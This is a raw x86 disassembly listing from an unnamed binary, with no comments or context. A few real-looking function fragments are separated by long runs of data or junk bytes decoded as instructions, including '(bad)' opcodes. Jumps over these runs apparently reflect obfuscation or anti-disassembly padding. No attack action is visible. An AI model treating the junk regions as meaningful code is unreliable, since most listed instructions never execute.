  40cacb:	test   DWORD PTR [ebp+eax*8+0x22a48a68],esp
  40cad2:	pop    ebx
  40cad3:	inc    edx
  40cad4:	adc    eax,0xbe13fcdb
  40cad9:	test   eax,0x3abc3cc0
  40cade:	sar    al,0xa0
  40cae1:	push   cs
  40cae2:	icebp  
  40cae3:	add    eax,0xb68c1993
  40cae8:	adc    esi,edi
  40caea:	fmul   QWORD PTR [esi+edx*2+0x4f]
  40caee:	pop    DWORD PTR [ebx]
  40caf0:	lock cwde 
  40caf2:	dec    edx
  40caf3:	sub    eax,DWORD PTR [ecx+edi*4-0x66afac59]
  40cafa:	jmp    0x40caee
  40cafc:	xchg   esp,eax
  40cafd:	mov    ebx,0xcf562930
  40cb02:	jne    0x40ca86
  40cb04:	shr    DWORD PTR [ecx],cl
  40cb06:	jmp    0x1d8d:0xe1151ecc
  40cb0d:	aas    
  40cb0e:	cmc    
  40cb0f:	xchg   edx,esp
  40cb11:	ja     0x40cb04
  40cb13:	cmp    eax,0x609039cd
  40cb18:	bound  eax,QWORD PTR [edx]
  40cb1a:	cli    
  40cb1b:	mov    dl,0x8a
  40cb1d:	or     ah,BYTE PTR [ebp+0x8f7d424]
  40cb23:	mov    al,ds:0xf923f5d9
  40cb28:	pop    eax
  40cb29:	es cld 
  40cb2b:	cld    
  40cb2c:	pop    es
  40cb2d:	jo     0x40cb2f
  40cb2f:	(bad)  [edi+0xe6809e3]
  40cb35:	pop    eax
  40cb36:	sar    DWORD PTR [ecx],0xb7
  40cb39:	mov    ch,0xf
  40cb3b:	scas   al,BYTE PTR es:[edi]
  40cb3c:	push   0x74
  40cb3e:	and    al,0x23
  40cb40:	xchg   esp,eax
  40cb41:	or     ebp,DWORD PTR [edx]
  40cb43:	pop    esi
  40cb44:	sub    al,0x26
  40cb46:	popf   
  40cb47:	gs int3 
  40cb49:	in     al,dx
  40cb4a:	sbb    edi,DWORD PTR [ebx-0x3d]
  40cb4d:	or     al,0xba
  40cb4f:	xchg   ecx,eax
  40cb50:	mov    BYTE PTR [eax+0x24],bh
  40cb53:	push   esi
  40cb54:	int    0x68
  40cb56:	pop    ebx
  40cb57:	cmp    ecx,ebx
  40cb59:	xchg   DWORD PTR [edx],esi
  40cb5b:	mov    bl,0xa1
  40cb5d:	sbb    cl,bh
  40cb5f:	mov    dh,0x42
  40cb61:	loopne 0x40cb8a
  40cb63:	std    
  40cb64:	ss push edx
  40cb66:	sub    DWORD PTR [edx-0x36],esi
  40cb69:	shr    BYTE PTR [eax-0x5e48513f],1
  40cb6f:	lds    esp,FWORD PTR [esi]
  40cb71:	jl     0x40cbd8
  40cb73:	mov    DWORD PTR [ebx+eax*1-0x1eb4370],ebx
  40cb7a:	jmp    0x40cb7d
  40cb7c:	jbe    0x40cb06
  40cb7e:	push   ds
  40cb7f:	das    
  40cb80:	mov    dh,BYTE PTR [ebx]
  40cb82:	bound  edi,QWORD PTR [edx+0x28]
  40cb85:	xchg   edi,eax
  40cb86:	pop    edi
  40cb87:	sbb    BYTE PTR es:[eax-0x1f],bl
  40cb8b:	inc    eax
  40cb8c:	cmp    BYTE PTR [ebp-0x71],0xd4
  40cb90:	mov    esi,0x89e49aad
  40cb95:	test   al,0x21
  40cb97:	fcomp  st(1)
  40cb99:	ins    BYTE PTR es:[edi],dx
  40cb9a:	mov    fs,WORD PTR [edx]
  40cb9c:	or     ch,bl
  40cb9e:	cmp    al,0x79
  40cba0:	imul   esi,ecx,0xffffffcf
  40cba3:	sti    
  40cba4:	jecxz  0x40cb58
  40cba6:	mov    ch,BYTE PTR [eax]
  40cba8:	xchg   ebx,eax
  40cba9:	pop    edi
  40cbaa:	inc    ebx
  40cbab:	mov    ecx,0xa80dc3ee
  40cbb0:	mov    ?,WORD PTR [edi+eiz*8-0x3274125f]
  40cbb7:	stc    
  40cbb8:	or     al,0xae
  40cbba:	sub    eax,0x59b37c5b
  40cbbf:	enter  0xf259,0x94
  40cbc3:	xchg   ebp,eax
  40cbc4:	push   0x67e897dd
  40cbc9:	adc    BYTE PTR [edx],dl
  40cbcb:	int3   
  40cbcc:	adc    DWORD PTR [esi+0x2eb3d1f6],0x63
  40cbd3:	xchg   ebp,eax
  40cbd4:	or     BYTE PTR [ebp-0x66],ah
  40cbd7:	stos   DWORD PTR es:[edi],eax
  40cbd8:	sti    
  40cbd9:	rcr    DWORD PTR [esi+esi*2+0x16],cl
  40cbdd:	je     0x40cba7
  40cbdf:	jae    0x40cc06
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x422660,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax-0x436ca7cc],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [ecx-0x21],dl
  40cc79:	push   es
  40cc7a:	fild   QWORD PTR [esi+0x5bb5dc8b]
  40cc80:	push   ebx
  40cc81:	sub    DWORD PTR [edi+0x3312ed4d],esi
  40cc87:	es js  0x40cc59
  40cc8a:	mov    esp,0x711e668a
  40cc8f:	imul   esp,ecx,0x9ba0ae73
  40cc95:	mov    dl,0x4d
  40cc97:	in     eax,0xa3
  40cc99:	das    
  40cc9a:	and    al,0x87
  40cc9c:	(bad)  [esi]
  40cc9e:	aas    
  40cc9f:	jle    0x40cc24
  40cca1:	pop    esi
  40cca2:	adc    ebx,eax
  40cca4:	pop    edx
  40cca5:	or     al,dl
  40cca7:	xchg   ecx,eax
  40cca8:	test   DWORD PTR [edx+0x21],esi
  40ccab:	out    dx,eax
  40ccac:	mov    al,ds:0xa224e776
  40ccb1:	in     eax,dx
  40ccb2:	retf   
  40ccb3:	sub    bh,al
  40ccb5:	mov    bl,0xc
  40ccb7:	inc    esi
  40ccb8:	imul   edi,edi,0x1c932f3d
  40ccbe:	cli    
  40ccbf:	cmovl  edi,DWORD PTR [ebx-0x23]
  40ccc3:	dec    esp
  40ccc4:	mov    eax,0x4bb87161
  40ccc9:	test   al,0x36
  40cccb:	dec    eax
  40cccc:	pop    esp
  40cccd:	addr16 inc edx
  40cccf:	rcr    DWORD PTR [esp+eax*4],0x19
  40ccd3:	xchg   ch,bl
  40ccd5:	jle    0x40cd16
  40ccd7:	sar    BYTE PTR [ebp-0x53361496],cl
  40ccdd:	xchg   DWORD PTR [ecx-0x38],ebx
  40cce0:	inc    ebx
  40cce1:	xor    DWORD PTR [ecx-0x27b56256],eax
  40cce7:	and    eax,0xa4d21009
  40ccec:	inc    eax
  40cced:	cld    
  40ccee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccef:	xchg   esi,eax
  40ccf0:	ss mov ah,0xe6
  40ccf3:	mov    ds:0x5515f69d,eax
  40ccf8:	push   ecx
  40ccf9:	fst    st(2)
  40ccfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccfc:	das    
  40ccfd:	std    
  40ccfe:	sbb    al,0x20
  40cd00:	mov    edi,0xa19a571e
  40cd05:	push   ebx
  40cd07:	daa    
  40cd08:	inc    esp
  40cd09:	or     BYTE PTR [ebp-0x1bab3e52],bh
  40cd0f:	pop    ds
  40cd10:	or     esp,DWORD PTR [edi+0x36]
  40cd13:	pop    ss
  40cd14:	sbb    BYTE PTR [ebp+0x78],cl
  40cd17:	sub    eax,0x99a40db5
  40cd1c:	aad    0x72
  40cd1e:	or     eax,0xc0a88f7b
  40cd23:	pushf  
  40cd24:	ins    BYTE PTR es:[edi],dx
  40cd25:	aaa    
  40cd26:	mov    cl,0x6f
  40cd28:	jmp    FWORD PTR [ebx]
  40cd2a:	pusha  
  40cd2b:	jbe    0x40cd1d
  40cd2d:	jb     0x40cdab
  40cd2f:	(bad)  
  40cd30:	sbb    BYTE PTR ds:0xe25f88c5,cl
  40cd36:	mov    eax,ds:0x6cf5bb73
  40cd3b:	mov    esp,0xb3a5650f
  40cd40:	out    dx,al
  40cd41:	mov    eax,0xf12cf047
  40cd46:	pop    eax
  40cd47:	loopne 0x40cd46
  40cd49:	add    DWORD PTR [edi+0x302e6a0c],0x20a084f1
  40cd53:	pop    esp
  40cd54:	jmp    0x7557:0xe6dcd9cd
  40cd5b:	push   cs
  40cd5c:	mov    DWORD PTR [ecx+0x3f],ecx
  40cd5f:	adc    eax,esp
  40cd61:	mov    edx,0xc1bc1bb0
  40cd66:	xchg   esp,eax
  40cd67:	pop    edi
  40cd68:	mov    dl,0x3c
  40cd6a:	mov    esi,0x99bac546
  40cd6f:	dec    eax
  40cd70:	jmp    0x85cf:0x9e16f481
  40cd77:	out    0xbc,eax
  40cd79:	xchg   ecx,eax
  40cd7a:	add    eax,0x9e719573
  40cd7f:	clc    
  40cd80:	aad    0x43
  40cd82:	add    eax,0x7172431e
  40cd87:	pushf  
  40cd88:	xchg   ebp,eax
  40cd89:	(bad)  
  40cd8a:	push   ss
  40cd8b:	fsub   DWORD PTR [ecx+0x14]
  40cd8e:	into   
  40cd8f:	call   0x5c873f9e
  40cd94:	shl    dh,1
  40cd96:	cmc    
  40cd97:	jmp    0x40cddb
  40cd99:	in     al,0x42
  40cd9b:	mov    ecx,0x27707bb7
  40cda0:	retf   0xa99c
  40cda3:	and    cl,bl
  40cda5:	in     al,0xf2
  40cda7:	and    cl,BYTE PTR [ebx-0x26]
  40cdaa:	popf   
  40cdab:	push   0x75e0ac96
  40cdb0:	icebp  
  40cdb1:	shl    BYTE PTR [edx],cl
  40cdb3:	sbb    al,BYTE PTR [ebp+ebx*1+0x2]
  40cdb7:	je     0x40cdd7
  40cdb9:	lods   eax,DWORD PTR ds:[esi]
  40cdba:	loope  0x40cdc7
  40cdbc:	mov    dh,BYTE PTR [ebx+0x15a0d1]
  40cdc2:	and    DWORD PTR [edx-0x20],eax
  40cdc5:	mov    ebx,0xef59acc3
  40cdca:	fs cld 
  40cdcc:	(bad)  
  40cdcd:	xor    eax,0x2b3d1c55
  40cdd2:	mov    eax,ds:0xbc2b8b1b
  40cdd7:	mov    esp,0xcfc4e7ed
  40cddc:	mov    DWORD PTR [eax],ebp
  40cdde:	and    edx,esp
  40cde0:	mov    cl,0x81
  40cde2:	jae    0x40ce42
  40cde4:	add    BYTE PTR [ebp-0x40],dh
  40cde7:	mov    ch,0xea
  40cde9:	retf   0x55ea
  40cdec:	int    0xaa
  40cdee:	mov    eax,0x12af7d1e
  40cdf3:	push   ebp
  40cdf4:	push   esp
  40cdf5:	or     eax,0x26395d8c
  40cdfa:	pop    ss
  40cdfb:	jns    0x40cdcb
  40cdfd:	xchg   ecx,eax
  40cdfe:	adc    al,0x94
  40ce00:	sahf   
  40ce01:	lahf   
  40ce02:	ja     0x40ce15
  40ce04:	stos   BYTE PTR es:[edi],al
  40ce05:	and    BYTE PTR [ecx],al
  40ce07:	fwait
  40ce08:	loopne 0x40cdd3
  40ce0a:	int3   
  40ce0b:	outs   dx,BYTE PTR ds:[esi]
  40ce0c:	ret    0x491d
  40ce0f:	add    cl,ch
  40ce11:	and    al,BYTE PTR [eax-0x46]
  40ce14:	mov    DWORD PTR [ebx],esp
  40ce16:	mov    eax,0xd5dc6ea3
  40ce1b:	pop    ebx
  40ce1c:	and    eax,0xa73feb6a
  40ce21:	add    ebx,DWORD PTR [edx]
  40ce23:	sbb    BYTE PTR [edi+0x66],cl
  40ce26:	push   edx
  40ce27:	mov    ebx,0x8d47e6b1
  40ce2c:	adc    dl,bl
  40ce2e:	inc    esp
  40ce2f:	inc    edx
  40ce30:	in     eax,0x93
  40ce32:	lock repz in eax,dx
  40ce35:	add    eax,0x7118951c
  40ce3a:	sub    eax,0x2ef9329b
  40ce3f:	loop   0x40ce67
  40ce41:	mov    eax,ds:0x67b2d4d3
  40ce46:	out    0xb4,eax
  40ce48:	push   edi
  40ce49:	xchg   esp,eax
  40ce4a:	jbe    0x40cdfe
  40ce4c:	fnstsw WORD PTR [edi+eax*8]
  40ce4f:	das    
  40ce50:	pop    ds
  40ce51:	cmp    BYTE PTR [ecx+0x3d],cl
  40ce54:	shr    DWORD PTR [eax],1
  40ce56:	lods   eax,DWORD PTR ds:[esi]
  40ce57:	inc    eax
  40ce58:	mov    al,ds:0x2adb963d
  40ce5d:	js     0x40ce1c
  40ce5f:	push   ebx
  40ce60:	das    
  40ce61:	fstp   TBYTE PTR [ebp-0x60]
  40ce64:	jnp    0x40ce21
  40ce66:	into   
  40ce67:	(bad)  
  40ce68:	adc    BYTE PTR [esi],ch
  40ce6a:	mov    ah,0x5c
  40ce6c:	jge    0x40ce98
  40ce6e:	imul   ecx,DWORD PTR [edx+0xf],0x65
  40ce72:	mov    dh,0x5b
  40ce74:	repz fdivr st(5),st
  40ce77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce78:	arpl   WORD PTR [edx-0x41],si
  40ce7b:	or     ebp,DWORD PTR [ebx+0x66]
  40ce7e:	popa   
  40ce7f:	push   ebp
  40ce80:	xchg   edi,eax
  40ce81:	(bad)  
  40ce82:	push   esi
  40ce83:	jno    0x40ceca
  40ce85:	mov    ecx,0x77fd3f01
  40ce8a:	sub    al,BYTE PTR [edx-0x5d]
  40ce8d:	push   edi
  40ce8e:	adc    al,0xad
  40ce90:	or     DWORD PTR [edx],ebp
  40ce92:	into   
  40ce93:	inc    edx
  40ce94:	fcomp  QWORD PTR [eax]
  40ce96:	fidivr DWORD PTR [ecx+0x15]
  40ce99:	out    dx,eax
  40ce9a:	jl     0x40ce96
  40ce9c:	add    cl,BYTE PTR [edi+ebp*4+0x3e]
  40cea0:	sbb    DWORD PTR ds:0xa5c6210d,ecx
  40cea6:	(bad)  
  40cea8:	jle    0x40ce4a
  40ceaa:	pusha  
  40ceab:	packsswb mm3,QWORD PTR [edi+0x4736e570]
  40ceb2:	xchg   esp,eax
  40ceb3:	and    ecx,0x36
  40ceb6:	loopne 0x40ce77
  40ceb8:	push   ecx
  40ceb9:	lds    edi,FWORD PTR [ecx]
  40cebb:	(bad)  
  40cebc:	dec    esp
  40cebd:	pop    ecx
  40cebe:	jnp    0x40cf16
  40cec0:	cmc    
  40cec1:	mov    al,ds:0x52db1c18
  40cec6:	sub    eax,eax
  40cec8:	loop   0x40cec2
  40ceca:	shl    BYTE PTR [edi+0x55cae3cd],0x7b
  40ced1:	jmp    FWORD PTR [esi+0x50]
  40ced4:	je     0x40ced2
  40ced6:	pop    edx
  40ced7:	jo     0x40cf24
  40ced9:	fucomi st,st(6)
  40cedb:	stos   BYTE PTR es:[edi],al
  40cedc:	xor    WORD PTR [eax-0x2cfb7656],sp
  40cee3:	adc    bh,ch
  40cee5:	jbe    0x40cf0d
  40cee7:	ins    BYTE PTR es:[edi],dx
  40cee8:	mov    esp,0x9380cd6
  40ceed:	mov    edi,0x8a89fcb0
  40cef2:	add    ecx,DWORD PTR [ebp-0x299e925d]
  40cef8:	dec    edx
  40cef9:	nop
  40cefa:	lods   eax,DWORD PTR ds:[esi]
  40cefb:	push   0xffffff92
  40cefd:	fcmovb st,st(2)
  40ceff:	mov    esp,0x254f32f0
  40cf04:	scas   al,BYTE PTR es:[edi]
  40cf05:	xchg   ecx,eax
  40cf06:	stc    
  40cf07:	lock mov ds:0x2df73638,eax
  40cf0d:	xchg   ecx,eax
  40cf0e:	and    al,0x4a
  40cf10:	stos   BYTE PTR es:[edi],al
  40cf11:	inc    ebp
  40cf12:	lods   eax,DWORD PTR ds:[esi]
  40cf13:	loope  0x40cefb
  40cf15:	sbb    al,0x9c
  40cf17:	jb     0x40cf74
  40cf19:	enter  0xc945,0x80
  40cf1d:	ins    DWORD PTR es:[edi],dx
  40cf1e:	mov    eax,DWORD PTR [ebp-0x4]
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422558
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi-0x2b47432d],esi
  40cfad:	fwait
  40cfae:	jo     0x40d022
  40cfb0:	call   0x1512e7cd
  40cfb5:	sbb    BYTE PTR [eax],bl
  40cfb7:	aas    
  40cfb8:	lock sub BYTE PTR [eax],dh
  40cfbb:	inc    ecx
  40cfbc:	mov    cl,0x5f
  40cfbe:	int3   
  40cfbf:	and    eax,0x43999e48
  40cfc4:	fist   DWORD PTR [ecx-0x58]
  40cfc7:	xor    al,0x6d
  40cfc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfca:	adc    eax,DWORD PTR [eax]
  40cfcc:	aad    0xa4
  40cfce:	add    al,0xf8
  40cfd0:	inc    edx
  40cfd1:	jle    0x40cf9f
  40cfd3:	arpl   WORD PTR [edi],dx
  40cfd5:	cli    
  40cfd6:	std    
  40cfd7:	lods   al,BYTE PTR ds:[esi]
  40cfd8:	cmp    eax,0x1e36a724
  40cfdd:	ror    DWORD PTR [eax-0xef59c61],0x30
  40cfe4:	fwait
  40cfe5:	xor    eax,0xcd408cae
  40cfea:	ins    BYTE PTR es:[edi],dx
  40cfeb:	ins    DWORD PTR es:[edi],dx
  40cfec:	or     bl,BYTE PTR [ebp+0x71]
  40cfef:	cmp    DWORD PTR [edx+ebx*2-0x4e17ad0a],esp
  40cff6:	xchg   ebx,eax
  40cff7:	mov    ebp,0x218280b9
  40cffc:	idiv   bl
  40cffe:	fsub   DWORD PTR [esi-0x3d34305e]
  40d004:	pop    eax
  40d005:	retf   
  40d006:	adc    al,BYTE PTR [ebx+edi*2]
  40d009:	pop    ebx
  40d00a:	sbb    BYTE PTR [edx],0x11
  40d00d:	mov    cl,0x48
  40d00f:	into   
  40d010:	sbb    BYTE PTR [ebx+0x4b],bh
  40d013:	inc    ecx
  40d014:	or     al,0x5f
  40d016:	nop
  40d017:	in     eax,0x1d
  40d019:	retf   
  40d01a:	cli    
  40d01b:	cbw    
  40d01d:	dec    ebx
  40d01e:	jns    0x40d01a
  40d020:	jp     0x40d029
  40d022:	mov    edx,0x1b2e5a0a
  40d027:	out    0x26,al
  40d029:	mov    ecx,0x3188802a
  40d02e:	shl    DWORD PTR [ebx-0x6a21e498],1
  40d034:	mov    al,0x40
  40d036:	adc    al,0xdc
  40d038:	inc    esi
  40d039:	mov    edx,eax
  40d03b:	pop    ss
  40d03c:	stc    
  40d03d:	inc    esi
  40d03e:	jbe    0x40d06a
  40d040:	std    
  40d041:	test   eax,0x9908a47d
  40d046:	in     al,0x6c
  40d048:	pop    esp
  40d049:	xor    esp,ecx
  40d04b:	lods   eax,DWORD PTR ds:[esi]
  40d04c:	mov    dh,0x6b
  40d04e:	add    ch,bh
  40d050:	mov    ch,0xa7
  40d052:	dec    ebx
  40d053:	inc    ebp
  40d054:	icebp  
  40d055:	dec    ecx
  40d056:	rcl    BYTE PTR [esi],0xc0
  40d059:	and    esi,ebx
  40d05b:	sub    ch,BYTE PTR [esi+0x7ad7591b]
  40d061:	mov    cs,WORD PTR [eax+0x48]
  40d064:	ret    
  40d065:	aaa    
  40d066:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d068:	mov    bh,0x56
  40d06a:	mov    gs,WORD PTR [ecx-0x44d5a98c]
  40d070:	(bad)  [ecx-0x5e]
  40d073:	ins    BYTE PTR es:[edi],dx
  40d074:	adc    esp,DWORD PTR ds:0xc630e534
  40d07a:	push   esi
  40d07b:	sbb    DWORD PTR [edi-0x29],ebp
  40d07e:	aaa    
  40d07f:	mov    al,ds:0xe15ca268
  40d084:	mul    DWORD PTR [esi+0x474f3d1f]
  40d08a:	or     DWORD PTR [esi+0x2f],edx
  40d08d:	leave  
  40d08e:	dec    DWORD PTR [eax+0x51]
  40d091:	jb     0x40d10e
  40d093:	pusha  
  40d094:	add    eax,esp
  40d096:	xor    ebx,0xd1787f5b
  40d09c:	inc    esp
  40d09d:	adc    DWORD PTR [edi],eax
  40d09f:	sbb    edi,DWORD PTR [ebx-0xf]
  40d0a2:	test   al,0x31
  40d0a4:	or     ecx,esp
  40d0a6:	xchg   DWORD PTR [ecx],esp
  40d0a8:	cdq    
  40d0a9:	lea    ebp,[ecx+0x17]
  40d0ac:	lods   al,BYTE PTR ds:[esi]
  40d0ad:	mov    eax,0xaa9b5949
  40d0b2:	push   ecx
  40d0b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0b5:	and    dh,ch
  40d0b7:	stos   DWORD PTR es:[edi],eax
  40d0b8:	dec    esp
  40d0b9:	pusha  
  40d0ba:	push   es
  40d0bb:	fild   WORD PTR [esi]
  40d0bd:	imul   eax,DWORD PTR [esi-0x6c],0x46264801
  40d0c4:	lds    ebp,FWORD PTR [ebx]
  40d0c6:	xchg   esi,eax
  40d0c7:	out    0xa7,al
  40d0c9:	push   ecx
  40d0ca:	(bad)  
  40d0cb:	pop    es
  40d0cc:	int    0xbb
  40d0ce:	mov    bl,0xe8
  40d0d1:	xchg   esi,eax
  40d0d2:	ins    DWORD PTR es:[edi],dx
  40d0d3:	call   0x9db9:0xa14ae694
  40d0da:	ret    
  40d0db:	xor    bh,dh
  40d0dd:	fimul  WORD PTR [edx-0x5e224b4b]
  40d0e3:	je     0x40d0d6
  40d0e5:	push   ebx
  40d0e6:	and    ah,BYTE PTR [ecx]
  40d0e8:	mov    BYTE PTR [edx],dl
  40d0ea:	mov    edi,0xb0a47645
  40d0ef:	jl     0x40d0b0
  40d0f1:	aad    0x40
  40d0f3:	and    ch,BYTE PTR [esi+ebp*4+0x1a]
  40d0f7:	popa   
  40d0f8:	xchg   BYTE PTR [ecx-0x51b1af41],ch
  40d0fe:	or     edx,DWORD PTR [eax+0xc]
  40d101:	mov    BYTE PTR [esi+0x3126934f],cl
  40d107:	cwde   
  40d108:	cmp    BYTE PTR [ebp+edi*1-0x6118cc95],ah
  40d10f:	cmp    BYTE PTR [ebx+0x0],ch
  40d112:	push   ebx
  40d113:	retf   
  40d114:	pop    ds
  40d115:	lods   eax,DWORD PTR ds:[esi]
  40d116:	xchg   edi,eax
  40d117:	sub    DWORD PTR [ebx-0x4a],esp
  40d11a:	jo     0x40d150
  40d11c:	add    BYTE PTR [ebx+0x4d],ch
  40d11f:	les    esp,FWORD PTR [eax-0x7]
  40d122:	and    DWORD PTR [edx-0x642de27c],esi
  40d128:	adc    BYTE PTR [ebx+0x26],ch
  40d12b:	cmp    bh,cl
  40d12d:	push   cs
  40d12e:	dec    eax
  40d12f:	inc    ebx
  40d130:	mov    ebp,0xb8250536
  40d135:	push   ebx
  40d136:	mov    ebp,0x643d036d
  40d13b:	inc    edx
  40d13c:	xor    ch,ah
  40d13e:	ss scas al,BYTE PTR es:[edi]
  40d140:	mov    eax,0x2ff6729
  40d145:	mov    edx,0x33d18d34
  40d14a:	pop    ss
  40d14b:	inc    esi
  40d14c:	jno    0x40d176
  40d14e:	aad    0xb6
  40d150:	pop    ebp
  40d151:	dec    edi
  40d152:	xlat   BYTE PTR ds:[ebx]
  40d153:	or     BYTE PTR [edx+0x933d126],0xba
  40d15a:	retf   
  40d15b:	int    0x49
  40d15d:	test   dl,ch
  40d15f:	dec    esi
  40d160:	dec    ebx
  40d161:	jae    0x40d12f
  40d163:	cdq    
  40d164:	call   0x9732:0x4f069883
  40d16b:	mov    eax,0xf09b1ad8
  40d170:	std    
  40d171:	sbb    eax,0xf9441fa8
  40d176:	ror    DWORD PTR [ebx-0x22],cl
  40d179:	jno    0x40d19a
  40d17b:	dec    esp
  40d17c:	stc    
  40d17d:	loope  0x40d161
  40d17f:	out    0x2e,al
  40d181:	xor    al,0x2b
  40d183:	into   
  40d184:	jmp    0xb0b98bbf
  40d189:	fnstcw WORD PTR [eax+edx*2+0x30]
  40d18d:	or     esp,eax
  40d18f:	inc    edx
  40d190:	(bad)  
  40d191:	pusha  
  40d192:	dec    esp
  40d193:	cmp    BYTE PTR [ecx+0x63393ab9],0x32
  40d19a:	sub    BYTE PTR [edx],dl
  40d19c:	es sub eax,0x52f89100
  40d1a2:	out    dx,al
  40d1a3:	sbb    DWORD PTR [edi],edi
  40d1a5:	mov    dh,0xca
  40d1a7:	out    0xc9,eax
  40d1a9:	stos   BYTE PTR es:[edi],al
  40d1aa:	mov    ch,BYTE PTR [eax-0x397bb3d4]
  40d1b0:	aad    0xe
  40d1b2:	jo     0x40d225
  40d1b4:	xchg   esi,eax
  40d1b5:	adc    BYTE PTR [edx],al
  40d1b7:	add    DWORD PTR [esi+0x61],ebx
  40d1ba:	cmp    esi,ebx
  40d1bc:	int    0x6e
  40d1be:	or     edx,edx
  40d1c0:	std    
  40d1c1:	push   ecx
  40d1c2:	stc    
  40d1c3:	sbb    DWORD PTR [ecx+edx*8],ebp
  40d1c6:	mov    ch,0x6f
  40d1c8:	popa   
  40d1c9:	xor    eax,0xa8915b3b
  40d1ce:	and    esp,0xfffffffc
  40d1d1:	in     eax,0x31
  40d1d3:	mov    ebp,0xcf3a296e
  40d1d8:	cli    
  40d1d9:	jbe    0x40d1c6
  40d1db:	mov    BYTE PTR [esi-0x74acd855],bl
  40d1e1:	or     esp,DWORD PTR [ebx-0x2808904]
  40d1e7:	xchg   esp,eax
  40d1e8:	in     al,0xa3
  40d1ea:	out    0x2a,eax
  40d1ec:	pop    ecx
  40d1ed:	add    eax,0xbf914e18
  40d1f2:	scas   eax,DWORD PTR es:[edi]
  40d1f3:	pop    esi
  40d1f4:	bound  ebx,QWORD PTR [ebx+0x15]
  40d1f7:	cmp    ebx,0x2e
  40d1fa:	pop    esi
  40d1fb:	out    dx,al
  40d1fc:	jmp    0xbe806667
  40d201:	jae    0x40d188
  40d203:	or     bh,dh
  40d205:	pop    ss
  40d206:	sub    DWORD PTR [ebx],edi
  40d208:	sub    dl,cl
  40d20a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d20b:	jbe    0x40d1d9
  40d20d:	ins    DWORD PTR es:[edi],dx
  40d20e:	hlt    
  40d20f:	cmp    edx,DWORD PTR [edi+0x46]
  40d212:	ja     0x40d292
  40d214:	mov    al,0xf8
  40d216:	ja     0x40d287
  40d218:	or     esp,DWORD PTR [eax+0x48]
  40d21b:	cli    
  40d21c:	mov    ds:0x8febcf88,eax
  40d221:	in     al,dx
  40d222:	mov    ds:0x5df71a8f,eax
  40d227:	xchg   al,bh
  40d229:	gs (bad) 
  40d22b:	(bad)  
  40d22c:	mov    ebp,0x6a04c4e0
  40d231:	dec    ebx
  40d232:	(bad)  
  40d233:	dec    edx
  40d234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d235:	and    BYTE PTR [ecx-0xa70fe43],bh
  40d23b:	mov    ch,0x29
  40d23d:	pop    edi
  40d23e:	ss mov al,0x98
  40d241:	mov    esp,0x8a18cb88
  40d246:	or     al,0xa4
  40d248:	and    al,0x21
  40d24a:	fwait
  40d24b:	or     eax,esp
  40d24d:	nop
